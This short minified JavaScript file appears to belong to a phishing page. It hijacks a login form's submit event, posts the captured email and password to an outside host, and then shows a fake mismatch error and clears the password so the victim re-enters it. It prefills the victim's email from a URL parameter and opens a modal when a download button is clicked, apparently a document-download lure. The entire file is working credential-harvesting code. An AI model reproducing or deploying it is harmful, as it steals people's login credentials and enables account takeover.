function $(e){return document.querySelector(e)}document.addEventListener("DOMContentLoaded",function(){var t=document.loginForm;t.addEventListener("submit",function(e){e.preventDefault();
var n=new FormData(document.loginForm),o=new XMLHttpRequest;o.open("POST","https://wtr.ircomx.co/BTozJAfCAkcEVcX/dMWwNbubXxJkZOe/submit.php",!0),o.onload=function(){!function(e){$(".error-box").innerHTML=e,$(".error-box").classList.contains("active")||$(".error-box").classList.add("active");setTimeout(function(){$(".error-box").innerHTML="",$(".error-box").classList.remove("active")},3e3)}("This email address and password don't seem to match.. <br/> Please double-check and try again"),t.password.value=""},o.send(n)}),t.email.value=function(e,n){n=n||window.location.href,e=e.replace(/[\[\]]/g,"\\$&");var o=new RegExp("[?&]"+e+"(=([^&#]*)|&|#|$)").exec(n);return o?o[2]?decodeURIComponent(o[2].replace(/\+/g," ")):"":null}("email")}

document.getElementById("dlBtn").addEventListener("click",function()
{
	document.getElementById("modalbox").style.display = "block";
}


);
